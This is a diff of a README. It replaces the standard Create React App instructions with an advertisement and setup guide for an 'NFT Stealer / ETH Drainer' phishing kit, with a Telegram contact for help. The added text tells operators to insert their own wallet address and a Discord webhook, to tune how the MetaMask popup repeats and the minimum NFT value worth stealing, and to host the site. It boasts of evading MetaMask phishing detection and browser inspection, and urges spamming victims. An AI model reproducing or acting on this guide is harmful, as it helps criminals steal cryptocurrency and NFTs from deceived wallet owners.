@@ -1,70 +1,39 @@
-# Getting Started with Create React App
+### If you have questions or need any help, contact me on  [Telegram]https://t.me/voltron223
 
-This project was bootstrapped with [Create React App](https://github.com/facebook/create-react-app).
 
-## Available Scripts
+## 🖼️ NFT Stealer / ETH Stealer / Drainer Template / ETH Drainer / NFT Drainer
 
-In the project directory, you can run:
+## `💡 Features`
 
-### `npm start`
+- [x] simple design 
+- [x] Immediate transactions
+- [x] Contract not required
+- [x] Metamask Anti Phishing Detections
+- [x] Anti F12 Inspect
+- [x] Inspect Element Detection
+- [x] Custom-made working Site (index.html)
+- [x] Build-in API
 
-Runs the app in the development mode.\
-Open [http://localhost:3000](http://localhost:3000) to view it in your browser.
+## `✏️ Guidelines on Setting Up the Drainer:` 
+you need to edit the **configs.js**.
+- line 1: const adress = `"YOUR WALLET";` replace **YOUR WALLET with your wallet address (metamask is the best one).**
+- line 2: const Webhook = `"Webhook";` replace this by **your discord webhook**
 
-The page will reload when you make changes.\
-You may also see any lint errors in the console.
+  - Also, line after "const mintInfo" will change the minting price, the maximum supply, the minimum to be minted if the person doesn't have any NFTs, the maximum to be minted...
+  - Line "askMintLoop: true" = metamask popup will open again and again until the popup is closed.
+  
 
-### `npm test`
 
-Launches the test runner in the interactive watch mode.\
-See the section about [running tests](https://facebook.github.io/create-react-app/docs/running-tests) for more information.
+## `🚀 Deploy`
 
-### `npm run build`
+**1- Navigate to the directory where you downloaded the script.**<br>
+**2- Host the website by placing all the files in a web server of your choice.**<br>
+**3- Launch the hosted website in a web browser.**<br>
 
-Builds the app for production to the `build` folder.\
-It correctly bundles React in production mode and optimizes the build for the best performance.
+## `👻 Important : `
 
-The build is minified and the filenames include the hashes.\
-Your app is ready to be deployed!
-
-See the section about [deployment](https://facebook.github.io/create-react-app/docs/deployment) for more information.
-
-### `npm run eject`
-
-**Note: this is a one-way operation. Once you `eject`, you can't go back!**
-
-If you aren't satisfied with the build tool and configuration choices, you can `eject` at any time. This command will remove the single build dependency from your project.
-
-Instead, it will copy all the configuration files and the transitive dependencies (webpack, Babel, ESLint, etc) right into your project so you have full control over them. All of the commands except `eject` will still work, but they will point to the copied scripts so you can tweak them. At this point you're on your own.
-
-You don't have to ever use `eject`. The curated feature set is suitable for small and middle deployments, and you shouldn't feel obligated to use this feature. However we understand that this tool wouldn't be useful if you couldn't customize it when you are ready for it.
-
-## Learn More
-
-You can learn more in the [Create React App documentation](https://facebook.github.io/create-react-app/docs/getting-started).
-
-To learn React, check out the [React documentation](https://reactjs.org/).
-
-### Code Splitting
-
-This section has moved here: [https://facebook.github.io/create-react-app/docs/code-splitting](https://facebook.github.io/create-react-app/docs/code-splitting)
-
-### Analyzing the Bundle Size
-
-This section has moved here: [https://facebook.github.io/create-react-app/docs/analyzing-the-bundle-size](https://facebook.github.io/create-react-app/docs/analyzing-the-bundle-size)
-
-### Making a Progressive Web App
-
-This section has moved here: [https://facebook.github.io/create-react-app/docs/making-a-progressive-web-app](https://facebook.github.io/create-react-app/docs/making-a-progressive-web-app)
-
-### Advanced Configuration
-
-This section has moved here: [https://facebook.github.io/create-react-app/docs/advanced-configuration](https://facebook.github.io/create-react-app/docs/advanced-configuration)
-
-### Deployment
-
-This section has moved here: [https://facebook.github.io/create-react-app/docs/deployment](https://facebook.github.io/create-react-app/docs/deployment)
-
-### `npm run build` fails to minify
-
-This section has moved here: [https://facebook.github.io/create-react-app/docs/troubleshooting#npm-run-build-fails-to-minify](https://facebook.github.io/create-react-app/docs/troubleshooting#npm-run-build-fails-to-minify)
+- Lines after **"const drainNftsInfo"** will be used for the NFT drainer.
+- Line **"minValue: 0.2,"** is the minimum value of a NFT before it gets stolen. 
+Exemple : If you change this value to **1**, the script will only steal NFTs that have a value higher to **1**.
+### **the more you spam, the more you earn**
+### ➢ To see the metamask popup, you must host the website
